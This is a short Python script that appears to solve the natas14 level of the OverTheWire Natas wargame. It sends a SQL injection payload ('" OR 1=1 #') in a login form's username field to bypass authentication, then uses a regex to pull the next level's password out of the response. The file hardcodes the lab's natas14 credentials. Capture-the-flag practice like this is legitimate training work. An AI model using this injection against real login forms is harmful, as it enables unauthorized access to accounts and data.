import requests
import re

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = f"http://{username}.natas.labs.overthewire.org/?debug=true"


session = requests.Session()

response = session.post(url, auth = (username, password), data = {"username": '" OR 1=1 #', "password": "admin"}, )

print(re.findall('password for natas15 is (.*)<br>', response.text)[0])




